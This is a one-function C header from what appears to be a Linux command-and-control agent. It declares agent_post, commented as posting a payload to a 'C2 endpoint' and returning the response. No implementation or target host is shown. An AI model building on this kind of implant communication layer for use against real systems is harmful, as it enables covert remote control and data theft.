// linux-agent/include/comms_linux.h
#pragma once
#include <stddef.h>

// POST data to C2 endpoint, receive response
// Returns 0 on success, -1 on failure
int agent_post(const char* endpoint,
               const unsigned char* payload, size_t paylen,
               unsigned char** resp_out, size_t* resp_len);
